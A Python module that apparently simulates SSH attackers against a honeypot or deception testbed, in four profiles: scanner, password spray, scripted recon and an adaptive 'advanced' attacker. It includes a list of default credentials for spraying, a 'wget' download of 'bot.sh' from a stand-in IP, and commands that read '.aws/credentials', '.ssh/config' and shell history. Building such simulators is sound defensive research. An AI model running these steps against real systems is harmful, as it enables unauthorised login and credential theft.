"""
S7 Attacker Profiles (Paramiko).
Four profiles:
  - scanner: connects and drops
  - spray: tries several common passwords
  - script_kiddie: logs in, runs fixed recon + download attempt
  - advanced: reactive seeded attacker that inspects ls output, reads files,
              discovers referenced hosts/files/tokens, and adapts next commands
"""

import random
import re
import time


def _send_and_read(shell, cmd: str, wait_s: float = 0.8) -> str:
    shell.send(cmd + "\n")
    time.sleep(wait_s)
    buf = []
    while shell.recv_ready():
        buf.append(shell.recv(8192).decode("utf-8", "ignore"))
        time.sleep(0.05)
    return "".join(buf)


def run_scanner(host: str, port: int, rng: random.Random):
    import paramiko
    t = paramiko.Transport((host, port))
    t.connect()
    time.sleep(0.2)
    t.close()
    return {"profile": "scanner", "commands": []}


def run_spray(host: str, port: int, rng: random.Random):
    import paramiko
    creds = [("root", "123456"), ("admin", "password"), ("ubuntu", "12345"), ("test", "qwerty"), ("pi", "admin")]
    rng.shuffle(creds)
    for user, pw in creds[:4]:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            c.connect(host, port=port, username=user, password=pw, timeout=5, allow_agent=False, look_for_keys=False)
            c.close()
            break
        except Exception:
            time.sleep(0.25)
    return {"profile": "spray", "commands": []}


def run_script_kiddie(host: str, port: int, rng: random.Random):
    import paramiko
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(host, port=port, username="admin", password="admin", timeout=8, allow_agent=False, look_for_keys=False)
    shell = c.invoke_shell()
    time.sleep(0.6)
    if shell.recv_ready():
        shell.recv(8192)
    cmds = ["uname -a", "id", "ls -la", "wget http://198.51.100.10/bot.sh", "exit"]
    for cmd in cmds:
        _send_and_read(shell, cmd, wait_s=0.6)
    c.close()
    return {"profile": "script_kiddie", "commands": cmds}


def run_advanced(host: str, port: int, rng: random.Random):
    """
    Reactive attacker: parses `ls` listings, opens discovered files,
    follows clues into `/opt/inventory-app` or `.aws/credentials`,
    and waits long enough (~2.5s) between steps for live decisions to land.
    """
    import paramiko
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(host, port=port, username="admin", password="admin", timeout=8, allow_agent=False, look_for_keys=False)
    shell = c.invoke_shell()
    time.sleep(0.7)
    if shell.recv_ready():
        shell.recv(8192)

    executed = []

    def step(cmd: str, wait_s: float = 2.4) -> str:
        executed.append(cmd)
        return _send_and_read(shell, cmd, wait_s=wait_s)

    step("uname -a && id", wait_s=2.4)
    ls_home = step("ls -la /home/admin", wait_s=2.5)

    interesting = []
    for name in ["notes.txt", "backup.sh", ".bash_history"]:
        if name in ls_home:
            interesting.append(name)
    rng.shuffle(interesting)
    for fname in interesting[:2]:
        out = step(f"cat /home/admin/{fname}", wait_s=2.4)
        if "10.20.0.15" in out:
            step("cat /home/admin/.ssh/config", wait_s=2.4)

    # Check if live breadcrumb (.aws/credentials) or escalated folder appeared
    ls_aws = step("ls -la /home/admin/.aws", wait_s=2.4)
    if "credentials" in ls_aws:
        step("cat /home/admin/.aws/credentials", wait_s=2.4)

    ls_opt = step("ls -la /opt/inventory-app", wait_s=2.4)
    if "deploy-notes.txt" in ls_opt:
        step("cat /opt/inventory-app/deploy-notes.txt", wait_s=2.2)
    elif "config.yml" in ls_opt:
        step("cat /opt/inventory-app/config.yml", wait_s=2.2)

    # Optional lateral/exfil probe
    if rng.random() < 0.5:
        step("crontab -l", wait_s=1.5)
    step("exit", wait_s=0.5)
    c.close()
    return {"profile": "advanced", "commands": executed}
